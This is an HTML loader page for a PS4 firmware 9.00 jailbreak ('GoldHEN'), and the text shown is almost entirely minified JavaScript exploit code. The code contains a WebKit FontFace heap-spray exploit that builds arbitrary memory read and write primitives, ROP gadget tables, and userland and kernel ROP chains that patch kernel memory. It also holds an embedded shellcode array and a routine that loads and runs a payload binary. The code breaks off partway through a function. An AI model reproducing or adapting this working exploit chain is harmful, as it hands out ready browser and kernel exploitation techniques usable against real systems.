<html><head><style>body{background-color:#1451ae;color:#fff;text-align:center;margin:0;overflow:hidden}.progress{overflow:hidden;position:fixed;top:45%;left:50%;font-size:25px;font-family:sans-serif;transform:translate(-50%,-50%)}</style><meta charset="utf-8"><title>PS4 GOLDHEN LOADER</title></head><body onload="setTimeout(poc,500)"><div id="progress" class="progress">Loading Exploit... Please Wait</div><script>function disableUSB(){var a=new XMLHttpRequest;a.open("POST","./usboff",!0),a.send(null)}function ShutDown(){var a=new XMLHttpRequest;a.open("POST","./sleep",!0),a.send(null)}function enableUSB(){var a=new XMLHttpRequest;a.open("POST","./usbon",!0),a.send(null)}function USBWait(){var a=new XMLHttpRequest;return a.onreadystatechange=function(){a.readyState==XMLHttpRequest.DONE&&(wait=a.response)},a.open("POST","/usbwait",!1),a.send(null),wait}function sleep(a){return new Promise(i=>setTimeout(i,a))}function hen(){progress.innerHTML="Loading Goldhen. Please wait..";var a=new XMLHttpRequest;a.responseType="arraybuffer",a.open("GET","goldhen.bin"),a.send(),a.onreadystatechange=function(){if(4==a.readyState){PLD=a.response;var i=chain.syscall(477,0,4*PLD.byteLength,7,4098,-1,0),t=p.array_from_address(i,4*PLD.byteLength),r=new Uint8Array(4-a.response.byteLength%4%4),e=new Uint8Array(a.response.byteLength+r.byteLength);e.set(new Uint8Array(a.response),0),e.set(r,a.response.byteLength);var n=new Uint32Array(e.buffer);t.set(n,0);var s=p.malloc(16);chain.call(libKernelBase.add32(OFFSET_lk_pthread_create),s,0,i,0),progress.innerHTML="Done",ShutDown()}}}function int64(a,i){return this.low=a>>>0,this.hi=i>>>0,this.add32inplace=function(a){var i=((this.low>>>0)+a&4294967295)>>>0,t=this.hi>>>0;i<this.low&&t++,this.hi=t,this.low=i},this.add32=function(a){var i=((this.low>>>0)+a&4294967295)>>>0,t=this.hi>>>0;return i<this.low&&t++,new int64(i,t)},this.sub32=function(a){var i=((this.low>>>0)-a&4294967295)>>>0,t=this.hi>>>0;return i>this.low&4294967295&&t--,new int64(i,t)},this.sub32inplace=function(a){var i=((this.low>>>0)-a&4294967295)>>>0,t=this.hi>>>0;i>this.low&4294967295&&t--,this.hi=t,this.low=i},this.and32=function(a){return new int64(this.low&a,this.hi)},this.and64=function(a,i){return new int64(this.low&a,this.hi&i)},this.toString=function(a){var i=(this.low>>>0).toString(16),t=(this.hi>>>0).toString(16);return 0==this.hi?i:t+(i=zeroFill(i,8))},this}function zeroFill(a,i){return(i-=a.toString().length)>0?new Array(i+(/\./.test(a)?2:1)).join("0")+a:a+""}function zeroFill(a,i){return(i-=a.toString().length)>0?new Array(i+(/\./.test(a)?2:1)).join("0")+a:a+""}const stack_sz=262144,reserve_upper_stack=65536,stack_reserved_idx=16384;var chain,kchain,kchain2,SAVED_KERNEL_STACK_PTR,KERNEL_BASE_PTR,webKitBase,webKitRequirementBase,libSceLibcInternalBase,libKernelBase;window.rop=function(){return this.stackback=p.malloc32(65544),this.stack=this.stackback.add32(65536),this.stack_array=this.stackback.backing,this.retval=this.stackback.add32(262144),this.count=1,this.branches_count=0,this.branches_rsps=p.malloc(512),this.clear=function(){this.count=1,this.branches_count=0;for(var a=1;a<49152;a++)this.stack_array[a+16384]=0},this.pushSymbolic=function(){return this.count++,this.count-1},this.finalizeSymbolic=function(a,i){i instanceof int64?(this.stack_array[16384+2*a]=i.low,this.stack_array[16384+2*a+1]=i.hi):(this.stack_array[16384+2*a]=i,this.stack_array[16384+2*a+1]=0)},this.push=function(a){this.finalizeSymbolic(this.pushSymbolic(),a)},this.push_write8=function(a,i){this.push(gadgets["pop rdi"]),this.push(a),this.push(gadgets["pop rsi"]),this.push(i),this.push(gadgets["mov [rdi], rsi"])},this.fcall=function(a,i,t,r,e,n,s){return null!=i&&(this.push(gadgets["pop rdi"]),this.push(i)),null!=t&&(this.push(gadgets["pop rsi"]),this.push(t)),null!=r&&(this.push(gadgets["pop rdx"]),this.push(r)),null!=e&&(this.push(gadgets["pop rcx"]),this.push(e)),null!=n&&(this.push(gadgets["pop r8"]),this.push(n)),null!=s&&(this.push(gadgets["pop r9"]),this.push(s)),8&this.stack.add32(8*this.count).low&&this.push(gadgets.ret),this.push(a),this},this.call=function(a,i,t,r,e,n,s){return this.fcall(a,i,t,r,e,n,s),this.write_result(this.retval),this.run(),p.read8(this.retval)},this.syscall=function(a,i,t,r,e,n,s){return this.call(window.syscalls[a],i,t,r,e,n,s)},this.get_rsp=function(){return this.stack.add32(8*this.count)},this.write_result=function(a){this.push(gadgets["pop rdi"]),this.push(a),this.push(gadgets["mov [rdi], rax"])},this.write_result4=function(a){this.push(gadgets["pop rdi"]),this.push(a),this.push(gadgets["mov [rdi], eax"])},this.jmp_rsp=function(a){this.push(window.gadgets["pop rsp"]),this.push(a)},this.run=function(){p.launch_chain(this),this.clear()},this.KERNEL_BASE_PTR_VAR,this.set_kernel_var=function(a){this.KERNEL_BASE_PTR_VAR=a},this.rax_kernel=function(a){this.push(gadgets["pop rax"]),this.push(this.KERNEL_BASE_PTR_VAR),this.push(gadgets["mov rax, [rax]"]),this.push(gadgets["pop rsi"]),this.push(a),this.push(gadgets["add rax, rsi"])},this.write_kernel_addr_to_chain_later=function(a){this.push(gadgets["pop rdi"]);var i=this.pushSymbolic();return this.rax_kernel(a),this.push(gadgets["mov [rdi], rax"]),i},this.kwrite8=function(a,i){this.rax_kernel(a),this.push(gadgets["pop rsi"]),this.push(i),this.push(gadgets["mov [rax], rsi"])},this.kwrite4=function(a,i){this.rax_kernel(a),this.push(gadgets["pop rdx"]),this.push(i),this.push(gadgets["mov [rax], edx"])},this.kwrite2=function(a,i){this.rax_kernel(a),this.push(gadgets["pop rcx"]),this.push(i),this.push(gadgets["mov [rax], cx"])},this.kwrite1=function(a,i){this.rax_kernel(a),this.push(gadgets["pop rcx"]),this.push(i),this.push(gadgets["mov [rax], cl"])},this.kwrite8_kaddr=function(a,i){this.rax_kernel(i),this.push(gadgets["mov rdx, rax"]),this.rax_kernel(a),this.push(gadgets["mov [rax], rdx"])},this};var textArea=document.createElement("textarea");const OFFSET_wk_vtable_first_element=17101072,OFFSET_WK_memset_import=680,OFFSET_WK___stack_chk_fail_import=376,OFFSET_WK_psl_builtin_import=3432,OFFSET_WKR_psl_builtin=211872,OFFSET_WK_setjmp_gadget_one=17214711,OFFSET_WK_setjmp_gadget_two=32301523,OFFSET_WK_longjmp_gadget_one=17214711,OFFSET_WK_longjmp_gadget_two=32301523,OFFSET_libcint_memset=325648,OFFSET_libcint_setjmp=767420,OFFSET_libcint_longjmp=767510,OFFSET_WK2_TLS_IMAGE=59670560,OFFSET_lk___stack_chk_fail=130912,OFFSET_lk_pthread_create=152848,OFFSET_lk_pthread_join=44960;var handle,random_path,ex_info,nogc=[],syscalls={},gadgets={},wk_gadgetmap={ret:50,"pop rdi":3249808,"pop rsi":128214,"pop rdx":39020,"pop rcx":415671,"pop r8":11512433,"pop r9":4334961,"pop rax":334354,"pop rsp":320147,"mov [rdi], rsi":27883808,"mov [rdi], rax":17271031,"mov [rdi], eax":10052796,"cli ; pop rax":354040,sti:2079692,"mov rax, [rax]":147916,"mov rax, [rsi]":5310112,"mov [rax], rsi":32495760,"mov [rax], rdx":21129858,"mov [rax], edx":3899364,"add rax, rsi":24131966,"mov rdx, rax":5502209,"add rax, rcx":195533,"mov rsp, rdi":33849442,"mov rdi, [rax + 8] ; call [rax]":7675623,infloop:32255,"mov [rax], cl":814767},wkr_gadgetmap={"xchg rdi, rsp ; call [rsi - 0x79]":1930480},wk2_gadgetmap={"mov [rax], rdi":1048023,"mov [rax], rcx":2924234,"mov [rax], cx":22707538},hmd_gadgetmap={"add [r8], r12":179425},ipmi_gadgetmap={"mov rcx, [rdi] ; mov rsi, rax ; call [rcx + 0x30]":13387};function userland(){p.launch_chain=function(t){t.push(window.gadgets["pop rdi"]),t.push(s),t.push(libSceLibcInternalBase.add32(OFFSET_libcint_longjmp)),p.write8(a,e),textArea.scrollLeft=0,p.write8(h.add32(0),window.gadgets.ret),p.write8(h.add32(16),t.stack),p.write8(h.add32(64),p.read8(s.add32(64))),p.write8(a,n),textArea.scrollLeft=0,p.write8(a,i)},p.malloc=function(a){var i=new Uint8Array(65536+a);window.nogc.push(i);var t=p.read8(p.leakval(i).add32(16));return t.backing=i,t},p.malloc32=function(a){var i=new Uint8Array(65536+4*a);window.nogc.push(i);var t=p.read8(p.leakval(i).add32(16));return t.backing=new Uint32Array(i.buffer),t},p.stringify=function(a){for(var i=new Uint8Array(a.length+1),t=0;t<a.length;t++)i[t]=255&a.charCodeAt(t);return window.nogc.push(i),p.read8(p.leakval(i).add32(16))},p.array_from_address=function(a,i){var t=new Uint32Array(4096),r=p.leakval(t).add32(16);return p.write8(r,a),p.write4(r.add32(8),i),p.write4(r.add32(12),1),nogc.push(t),t},p.readstr=function(a){for(var i="",t=0;;t++){var r=p.read1(a.add32(t));if(0==r)break;i+=String.fromCharCode(r)}return i};var a=p.read8(p.leakval(textArea).add32(24)),i=p.read8(a);for(var t in webKitBase=p.read8(i).sub32(OFFSET_wk_vtable_first_element),(libSceLibcInternalBase=p.read8(r(webKitBase.add32(OFFSET_WK_memset_import)))).sub32inplace(OFFSET_libcint_memset),(libKernelBase=p.read8(r(webKitBase.add32(OFFSET_WK___stack_chk_fail_import)))).sub32inplace(OFFSET_lk___stack_chk_fail),(webKitRequirementBase=p.read8(r(webKitBase.add32(OFFSET_WK_psl_builtin_import)))).sub32inplace(OFFSET_WKR_psl_builtin),wk_gadgetmap)window.gadgets[t]=webKitBase.add32(wk_gadgetmap[t]);for(var t in wkr_gadgetmap)window.gadgets[t]=webKitRequirementBase.add32(wkr_gadgetmap[t]);function r(a){var i=65535&p.read4(a),t=p.read4(a.add32(2));return 9727!=i?0:a.add32(6+t)}var e=p.malloc32(512),n=p.malloc32(512),s=p.malloc32(64),h=p.malloc32(64);p.write8(e.add32(0),e),p.write8(e.add32(168),webKitBase.add32(OFFSET_WK_setjmp_gadget_two)),p.write8(e.add32(16),s),p.write8(e.add32(8),libSceLibcInternalBase.add32(OFFSET_libcint_setjmp)),p.write8(e.add32(456),webKitBase.add32(OFFSET_WK_setjmp_gadget_one)),p.write8(n.add32(0),n),p.write8(n.add32(168),webKitBase.add32(OFFSET_WK_longjmp_gadget_two)),p.write8(n.add32(16),h),p.write8(n.add32(8),libSceLibcInternalBase.add32(OFFSET_libcint_longjmp)),p.write8(n.add32(456),webKitBase.add32(OFFSET_WK_longjmp_gadget_one));var o,d=new Uint8Array(4096),c=p.leakval(d).add32(16),l=p.read8(c);p.write8(c,window.libKernelBase),p.write4(c.add32(8),262144);for(var _=0;_<262144;_++)if(114==d[_]&&100==d[_+1]&&108==d[_+2]&&111==d[_+3]&&99==d[_+4]){o=_;break}p.write4(c.add32(8),o+32);var u=new Uint32Array(1),w=new Uint8Array(u.buffer);for(_=0;_<o;_++)if(72==d[_]&&199==d[_+1]&&192==d[_+2]&&73==d[_+7]&&137==d[_+8]&&202==d[_+9]&&15==d[_+10]&&5==d[_+11]){w[0]=d[_+3],w[1]=d[_+4],w[2]=d[_+5],w[3]=d[_+6];var g=u[0];window.syscalls[g]=window.libKernelBase.add32(_)}if(p.write8(c,l),0==(chain=new rop).syscall(20).low)for(alert("webkit exploit failed. Try again if your ps4 is on fw 9.00.");;);}function run_hax(){userland(),0!=chain.syscall(23,0).low?(enableUSB(),kernel()):hen()}function kernel(){extra_gadgets(),kchain_setup(),object_setup(),trigger_spray()}function load_prx(a){var i=chain.syscall(594,p.stringify(`/${random_path}/common/lib/${a}`),0,handle,0);0!=i.low&&alert("failed to load prx/get handle "+a),p.write8(ex_info,424),0!=(i=chain.syscall(608,p.read4(handle),0,ex_info)).low&&alert("failed to get module info from handle");var t=p.read8(ex_info.add32(272));return 0!=p.read4(ex_info.add32(284))&&("libSceWebKit2.sprx"==a?t.sub32inplace(OFFSET_WK2_TLS_IMAGE):alert(`${a}, tlssize is non zero. this usually indicates that this module has a tls phdr with real data. You can hardcode the imgage to base offset here if you really wish to use one of these.`)),t}function extra_gadgets(){var a=(handle=p.malloc(488)).add32(4),i=handle.add32(20);ex_info=i.add32(64),p.write8(a,44),chain.syscall(602,0,i,a),random_path=p.readstr(i);var t=load_prx("libSceIpmi.sprx"),r=load_prx("libSceHmd.sprx"),e=load_prx("libSceWebKit2.sprx");for(var n in hmd_gadgetmap)window.gadgets[n]=r.add32(hmd_gadgetmap[n]);for(var n in wk2_gadgetmap)window.gadgets[n]=e.add32(wk2_gadgetmap[n]);for(var n in ipmi_gadgetmap)window.gadgets[n]=t.add32(ipmi_gadgetmap[n]);for(var n in window.gadgets)p.read8(window.gadgets[n]),chain.fcall(window.syscalls[203],window.gadgets[n],16);chain.run()}function kchain_setup(){SAVED_KERNEL_STACK_PTR=p.malloc(512),KERNEL_BASE_PTR=SAVED_KERNEL_STACK_PTR.add32(8),p.write8(KERNEL_BASE_PTR,new int64(4286636900,4294967295)),kchain=new rop,kchain2=new rop,chain.fcall(window.syscalls[203],kchain.stackback,262144),chain.fcall(window.syscalls[203],kchain2.stackback,262144),chain.fcall(window.syscalls[203],SAVED_KERNEL_STACK_PTR,16),chain.run(),kchain.count=0,kchain2.count=0,kchain.set_kernel_var(KERNEL_BASE_PTR),kchain2.set_kernel_var(KERNEL_BASE_PTR),kchain.push(gadgets["pop rax"]),kchain.push(SAVED_KERNEL_STACK_PTR),kchain.push(gadgets["mov [rax], rdi"]),kchain.push(gadgets["pop r8"]),kchain.push(KERNEL_BASE_PTR),kchain.push(gadgets["add [r8], r12"]),kchain.kwrite1(28478968,1),kchain.push(gadgets.sti);var a=kchain.write_kernel_addr_to_chain_later(3222592),i=kchain.write_kernel_addr_to_chain_later(2079049);kchain.push(gadgets["pop rdi"]),kchain.push(6),kchain.push(gadgets["pop rsi"]),kchain.push(gadgets["mov rsp, rdi"]),kchain.push(gadgets["pop rdx"]),kchain.push(14),kchain.push(gadgets["pop rcx"]),kchain.push(0),kchain.push(gadgets["pop r8"]),kchain.push(0);var t=kchain.get_rsp();kchain.pushSymbolic(),kchain.push(gadgets["pop rsi"]),kchain.push(2147745843),kchain.push(gadgets["pop rdi"]),kchain.push(kchain2.stack);var r=kchain.get_rsp();kchain.pushSymbolic(),kchain.finalizeSymbolic(a,t),kchain.finalizeSymbolic(i,r),kchain2.kwrite2(6449268,37008),kchain2.kwrite1(2765,235),kchain2.kwrite1(2561021,235),kchain2.kwrite1(2561089,235),kchain2.kwrite1(2561213,235),kchain2.kwrite1(2561281,235),kchain2.kwrite1(2561709,235),kchain2.kwrite1(2562909,235),kchain2.kwrite1(2563117,235),kchain2.kwrite1(28478968,0);var e=kchain2.write_kernel_addr_to_chain_later(1561856),n=kchain2.write_kernel_addr_to_chain_later(3222592);kchain2.push(gadgets["pop rdi"]),kchain2.push(6),kchain2.push(gadgets["pop rsi"]);var s=kchain2.get_rsp();kchain2.pushSymbolic(),kchain2.push(gadgets["pop rdx"]),kchain2.push(14),kchain2.push(gadgets["pop rcx"]),kchain2.push(0),kchain2.push(gadgets["pop r8"]),kchain2.push(0);var h=kchain2.get_rsp();kchain2.pushSymbolic(),kchain2.finalizeSymbolic(e,s),kchain2.finalizeSymbolic(n,h),kchain2.kwrite4(1168,0),kchain2.kwrite1(1218,235),kchain2.kwrite2(1209,37008),kchain2.kwrite2(1205,37008),kchain2.kwrite1(6662,235),kchain2.kwrite4(527245,0),kchain2.kwrite2(2338500,59792),kchain2.kwrite1(2340479,235),kchain2.kwrite4(2235200,3284152648),kchain2.kwrite1(1467178,55),kchain2.kwrite1(1467181,55),kchain2.kwrite4(17827104,2),kchain2.kwrite8_kaddr(17827112,313261),kchain2.kwrite4(17827148,1),kchain2.kwrite4(3857979,3284607503);var o=kchain2.write_kernel_addr_to_chain_later(3857979);kchain2.push(gadgets["pop rdi"]),kchain2.push(2147811379);var d=kchain2.get_rsp();kchain2.pushSymbolic(),kchain2.finalizeSymbolic(o,d),kchain2.rax_kernel(3770769),kchain2.push(gadgets["mov rdx, rax"]),kchain2.push(gadgets["pop rsi"]),kchain2.push(SAVED_KERNEL_STACK_PTR),kchain2.push(gadgets["mov rax, [rsi]"]),kchain2.push(gadgets["pop rcx"]),kchain2.push(16),kchain2.push(gadgets["add rax, rcx"]),kchain2.push(gadgets["mov [rax], rdx"]),kchain2.push(gadgets["pop rdi"]);var c=kchain2.pushSymbolic();kchain2.push(gadgets["mov [rdi], rax"]),kchain2.push(gadgets.sti),kchain2.push(gadgets["pop rsp"]);var l=kchain2.get_rsp();kchain2.pushSymbolic(),kchain2.finalizeSymbolic(c,l)}function object_setup(){var a=chain.syscall(477,16384,49152,3,4112,4294967295,0),i=a.add32(16384),t=a.add32(32768);if(16384!=a.low)for(alert("enomem: "+a);;);p.write8(a,t),p.write8(a.add32(104),i),p.write8(i.sub32(121),gadgets["cli ; pop rax"]),p.write8(i.add32(0),gadgets["xchg rdi, rsp ; call [rsi - 0x79]"]),p.write8(i.add32(8),kchain.stack),p.write8(i.add32(16),gadgets["mov rcx, [rdi] ; mov rsi, rax ; call [rcx + 0x30]"]),p.write8(t.add32(48),gadgets["mov rdi, [rax + 8] ; call [rax]"]),chain.syscall(203,a,49152)}var trigger_spray=function(){for(var a=p.malloc(1728),i=0;i<432;i++)chain.fcall(window.syscalls[362]),chain.write_result4(a.add32(4*i));chain.run();var t=p.array_from_address(a,432),r=chain.syscall(97,2,1,0);if(r.low<256||r.low>=512)for(alert("invalid socket");;);var e=p.malloc(32);p.write8(e.add32(0),r),p.write4(e.add32(8),131071),p.write4(e.add32(12),0),p.write8(e.add32(16),0),p.write8(e.add32(24),0);for(i=0;i<432;i++)chain.fcall(window.syscalls[363],t[i],e,1,0,0,0);chain.run();for(i=18;i<432;i+=2)chain.fcall(window.syscalls[6],t[i]);chain.run(),window.progress.innerHTML="Activating ExFatHax USB...",usbWaitTime=1*USBWait(),sleep(usbWaitTime).then(()=>{for(var a=1;a<432;a+=2)chain.fcall(window.syscalls[6],t[a]);if(chain.run(),0==chain.syscall(23,0).low){chain.fcall(window.syscalls[73],16384,49152),chain.fcall(window.syscalls[325]),chain.run();var i=chain.syscall(477,0,16384,7,4096,4294967295,0),r=p.array_from_address(i,4096);r[0]=3e3,r[1]=4270409728,r[2]=54365512,r[3]=251658240,r[4]=1213580037,r[5]=2336810377,r[6]=2515011710,r[7]=3892314112,r[8]=373,r[9]=53876223,r[10]=2336751616,r[11]=210749,r[12]=1066092544,r[13]=1962902856,r[14]=1032669419,r[15]=669,r[16]=4181035848,r[17]=1207959554,r[18]=52565387,r[19]=2336751616,r[20]=14084114,r[21]=2370306048,r[22]=171837,r[23]=898320384,r[24]=740,r[25]=85297992,r[26]=1207959555,r[27]=3118994059,r[28]=1207959552,r[29]=40058253,r[30]=2336751616,r[31]=180021,r[32]=361449472,r[33]=712,r[34]=3893529416,r[35]=156,r[36]=2050854216,r[37]=1207959554,r[38]=44709259,r[39]=2336751616,r[40]=174869,r[41]=311117824,r[42]=32744,r[43]=25552896,r[44]=3277651968,r[45]=1832749384,r[46]=1207959554,r[47]=40779009,r[48]=21495808,r[49]=159549,r[50]=1023494144,r[51]=624,r[52]=1899823432,r[53]=1207959554,r[54]=41041153,r[55]=21495808,r[56]=168765,r[57]=1023494144,r[58]=660,r[59]=1698496840,r[60]=1207959554,r[61]=40254721,r[62]=21495808,r[63]=165693,r[64]=1023494144,r[65]=648,r[66]=2302476616,r[67]=1207959554,r[68]=42614017,r[69]=21495808,r[70]=166717,r[71]=1023494144,r[72]=588,r[73]=1027408200,r[74]=3271557122,r[75]=3850979413,r[76]=283935560,r[77]=607422792,r[78]=609519944,r[79]=3977641736,r[80]=1207959553,r[81]=1265942661,r[82]=1220708680,r[83]=1212170379,r[84]=796180613,r[85]=678988616,r[86]=607927112,r[87]=2336754292,r[88]=3229960192,r[89]=3974831476,r[90]=410553160,r[91]=1962902856,r[92]=2139834605,r[93]=2084259856,r[94]=3799320612,r[95]=4279255239,r[96]=1224736767,r[97]=823163533,r[98]=835858934,r[99]=2769682377,r[100]=1207959553,r[101]=1561379971,r[102]=2303219139,r[103]=3223326693,r[104]=4294911304,r[105]=571473918,r[106]=1032538304,r[107]=456,r[108]=2425358279,r[109]=1204261008,r[110]=1217433604,r[111]=898320568,r[112]=428,r[113]=142051656,r[114]=1695565767,r[115]=3342633800,r[116]=2430023,r[117]=1204224e3,r[118]=2303197208,r[119]=474466104,r[120]=3091763344,r[121]=2100661064,r[122]=1207959553,r[123]=3340793737,r[124]=3343394887,r[125]=1204224256,r[126]=44,r[127]=2005747945,r[128]=361449524,r[129]=336,r[130]=2314348872,r[131]=2336763991,r[132]=92981,r[133]=1452099584,r[134]=3609806853,r[135]=3242786697,r[136]=2168981735,r[137]=59855,r[138]=1049184256,r[139]=3400,r[140]=571408385,r[141]=1438866880,r[142]=266701128,r[143]=625524768,r[144]=4294901759,r[145]=1220551183,r[146]=20594059,r[147]=130482176,r[148]=12828721,r[149]=893225800,r[150]=3338665985,r[151]=3284152583,r[152]=1032538112,r[153]=304,r[154]=3224438727,r[155]=2336751811,r[156]=76605,r[157]=822593280,r[158]=1208009664,r[159]=10894731,r[160]=2277965824,r[161]=2039297,r[162]=2425419313,r[163]=503678919,r[164]=3375431711,r[165]=2278002832,r[166]=2039305,r[167]=2425410097,r[168]=507414471,r[169]=3375431711,r[170]=222859408,r[171]=65536,r[172]=4290781711,r[173]=61205,r[174]=3223326464,r[175]=4294911304,r[176]=571473918,r[177]=1032538304,r[178]=220,r[179]=3224438727,r[180]=222822595,r[181]=65536,r[182]=1572872719,r[183]=1937339331,r[184]=1601004916,r[185]=1886614899,r[186]=1600417381,r[187]=1935763568,r[188]=1885287013,r[189]=1935631730,r[190]=6516345,r[191]=1953724787,r[192]=1918856549,r[193]=1836413797,r[194]=1752194917,r[195]=845509473,r[196]=1937339136,r[197]=1601004916,r[198]=1970496882,r[199]=1885300077,r[200]=1702060392,r[201]=2425356339,r[202]=0,r[203]=0,r[204]=1018096,r[205]=0,r[206]=3076464,r[207]=0,r[208]=101872,r[209]=0,r[210]=102128,r[211]=0,r[212]=40190224,r[213]=0,r[214]=619056,r[215]=0,r[216]=4206176,r[217]=0,r[218]=22151432,r[219]=0,r[220]=22151424,r[221]=0,r[222]=4599072,r[223]=0,r[224]=4599292,r[225]=0,r[226]=6445472,r[227]=0,r[228]=6449360,r[229]=0,r[230]=6446528,r[231]=0,r[232]=6447760,r[233]=0,r[234]=6448928,r[235]=0,chain.fcall(window.syscalls[203],i,16384),chain.fcall(i,p.read8(KERNEL_BASE_PTR)),chain.fcall(window.syscalls[73],i,16384),chain.run(),setTimeout(hen,150)}else disableUSB(),alert("Failed. Please try again"),p.write8(0,0)})},PAGE_SIZE=16384,SIZEOF_CSS_FONT_FACE=184,HASHMAP_BUCKET=208,STRING_OFFSET=20,SPRAY_FONTS=4106,GUESS_FONT=8602845184,NPAGES=20,INVALID_POINTER=0,HAMMER_FONT_NAME="font8",HAMMER_NSTRINGS=700;function poc(){for(var a=new ArrayBuffer(8),i=new Uint8Array(a),t=new Uint32Array(a),r=new Float64Array(a),e=[],n=0;n<SPRAY_FONTS;n++)e.push(new FontFace("font1","",{}));var s=new FontFace("font2","url(data:text/html,)",{});e.push(s);var h=[];for(n=0;n<512;n++)h.push(new Array(31));h[256][0]=1.5,h[257][0]={},h[258][0]=1.5;var o={a:h[256],b:new Uint32Array(1),c:!0},d={},c=1e7;function p(a){for(var i="",t=0;t<8;t++)i+=String.fromCharCode(a%256),a=(a-a%256)/256;return i}function l(a,i){void 0===i&&(i=0);for(var t=0,r=7;r>=0;r--)t=256*t+a.charCodeAt(i+r);return t}var _=[];function u(a,i){var t=i+"\0".repeat(a-STRING_OFFSET-8-i.length)+c++;return d[t]=1,_.push(t),t}var w=GUESS_FONT,g=!0,f=0,k=0;window.ffses={};do{var m=p(NPAGES+2);for(n=0;n<NPAGES;n++)m+=p(w+n*PAGE_SIZE);m+=p(INVALID_POINTER);for(n=0;n<256;n++)u(HASHMAP_BUCKET,m);ffses["search_"+ ++k]=new FontFaceSet(e);var S=u(HASHMAP_BUCKET,m),v=null,E=null;for(n=0;n<SPRAY_FONTS;n++)if(e[n].family="search"+k,S.substr(0,m.length)!=m){v=n;var b=S.substr(0,m.length);for(n=1;n<=NPAGES;n++)if(b.substr(8*n,8)!=m.substr(8*n,8)){E=l(m.substr(8*n,8));break}0==f++&&(w=E+2*PAGE_SIZE,E=null);break}(g=!g)&&(w+=NPAGES*PAGE_SIZE)}while(null===E);m="";m+=p(26),m+=p(E),m+=p(E+SIZEOF_CSS_FONT_FACE);for(n=0;n<19;n++)m+=p(INVALID_POINTER);for(n=0;n<256;n++)u(HASHMAP_BUCKET,m);var A=[];for(n=0;;n++){ffses["ffs_leak_"+n]=new FontFaceSet([e[v],e[v+1],s]);var x=u(HASHMAP_BUCKET,m);A.push(u(HASHMAP_BUCKET,m)),e[v].family="evil2",e[v+1].family="evil3";var F=l(x.substr(x.length-8));if(F<281474976710656)break}function y(a,i){var t="";t+="0000",t+="ÿ\0\0\0ÿÿÿÿ",t+=p(a),t+=p(2147483668),m="",m+=p(29),m+=p(E),m+=p(E+SIZEOF_CSS_FONT_FACE),m+=p(E+2*SIZEOF_CSS_FONT_FACE);for(var r=0;r<18;r++)m+=p(INVALID_POINTER);for(r=0;r<256;r++)u(HASHMAP_BUCKET,m);ffses[i]=new FontFaceSet([e[v],e[v+1],e[v+2],s]);u(HASHMAP_BUCKET,m);var n=u(HASHMAP_BUCKET,t);return e[v].family=i+"_evil1",e[v+1].family=i+"_evil2",e[v+2].family=i+"_evil3",A.push(n),n.length<1e3?y(a,i+"_"):n}var T=y(F,"ffs3");for(n=0;n<1e5;n++)u(128,"");var K=[];for(n=0;n<65536;n++)K.push({value:1094927426}),K.push({value:o});Object.defineProperties({},K);for(n=T.indexOf("BDCA\0\0þÿ");;n+=16)if(66==T.charCodeAt(n)&&68==T.charCodeAt(n+1)&&67==T.charCodeAt(n+2)&&65==T.charCodeAt(n+3)&&0==T.charCodeAt(n+4)&&0==T.charCodeAt(n+5)&&254==T.charCodeAt(n+6)&&255==T.charCodeAt(n+7)&&14==T.charCodeAt(n+24)){var O=l(T,n+32);break}var R=y(O,"ffs4"),P=l(R,16),B=l(R,24),N=l(y(P,"ffs5"),8),C=y(B,"ffs6");for(n=0;n<8;n++)i[n]=C.charCodeAt(n);var L=t[0],U=t[1];t[0]=65536,t[1]=0,h[257][1]={},h[257][0]=r[0],t[0]=E+12*SIZEOF_CSS_FONT_FACE|0,t[1]=(E-E%4294967296)/4294967296,h[256][n]=r[0],pp_s="",pp_s+=p(56);for(n=0;n<12;n++)pp_s+=p(E+n*SIZEOF_CSS_FONT_FACE);var H="";H+="0000",H+=p(INVALID_POINTER),H+=p(N),H+='\0\0\0\0"\0\0\0';var I=[];for(n=0;n<12;n++)I.push(e[v+n]);I.push(s);var M=[e[v+12]];for(n=0;n<5;n++)M.push(new FontFace(HAMMER_FONT_NAME,"url(data:text/html,)",{}));for(n=0;n<HAMMER_NSTRINGS;n++)u(HASHMAP_BUCKET,pp_s);ffses.ffs7=new FontFaceSet(I),u(HASHMAP_BUCKET,pp_s),ffses.ffs8=new FontFaceSet(M);var j=u(HASHMAP_BUCKET,H);A.push(j);for(n=0;n<13;n++)e[v+n].family="hammer"+n;function W(a){return h[257][32]=a,r[0]=h[258][0],4294967296*t[1]+t[0]}var D=new Uint32Array(8),G=new Uint8Array(1),z=new Uint32Array(8),V={obj:null},Z=W(G),q=W(V);t[0]=L,t[1]=U,i[6]=7;var X,Y,$={jscell:r[0],butterfly:!0,buffer:D,size:22136};function J(a,i){i[4]=0|a,i[5]=a/4294967296|0}function Q(a,i){J(a,D),D[6]=i}window.addrof=function(a){return V.obj=a,(i=z)[4]+4294967296*i[5];var i},window.fakeobj=function(a){return J(a,z),V.obj},window.read_mem_s=function(a,i){return Q(a,i),""+G},window.read_mem_b=function(a,i){Q(a,i);var t=new Uint8Array(i);return t.set(G),t},window.read_mem_as_string=function(a,i){for(var t=read_mem_b(a,i),r="",e=0;e<t.length;e++)r+=String.fromCharCode(t[e]);return r},window.ref_mem=function(a,i){return Q(a,i),G},window.read_mem=function(a,i){Q(a,i);for(var t=[],r=0;r<i;r++)t.push(G[r]);return t},window.write_mem=function(a,i){Q(a,i.length);for(var t=0;t<i.length;t++)G[t]=i[t]},window.read_ptr_at=function(a){for(var i=0,t=read_mem(a,8),r=7;r>=0;r--)i=256*i+t[r];return i},window.write_ptr_at=function(a,i){for(var t=[],r=0;r<8;r++)t.push(255&i),i/=256;write_mem(a,t)},X=W($)+16,t[0]=X,t[1]=(X-X%4294967296)/4294967296,h[258][0]=r[0],(Y=h[257][32])[4]=Z,Y[5]=(Z-Z%4294967296)/4294967296,$.buffer=z,Y[4]=q,Y[5]=(q-q%4294967296)/4294967296,Y=null,function(){var a=read_ptr_at(addrof(j)+8)-208;write_mem(a,read_mem(a-96,208));for(var i=0;i<A.length;i++){var t=read_ptr_at(addrof(A[i])+8);write_ptr_at(t,4294967296*(HASHMAP_BUCKET-20)+1),write_ptr_at(t+8,t+20),write_ptr_at(t+16,2147483668)}write_ptr_at(N+248,133143986207)}();var aa=new Uint32Array(8),ia=new Uint32Array(2),ta=addrof(ia),ra=fakeobj(addrof($)+16);$.buffer=ia,ra[7]=1,$.buffer=aa,ra[4]=ta,ra[5]=(ta-ta%4294967296)/4294967296,ra[7]=1;var ea={write8:function(a,i){aa[4]=a.low,aa[5]=a.hi,i instanceof int64?(ia[0]=i.low,ia[1]=i.hi):(ia[0]=i,ia[1]=0)},write4:function(a,i){aa[4]=a.low,aa[5]=a.hi,ia[0]=i instanceof 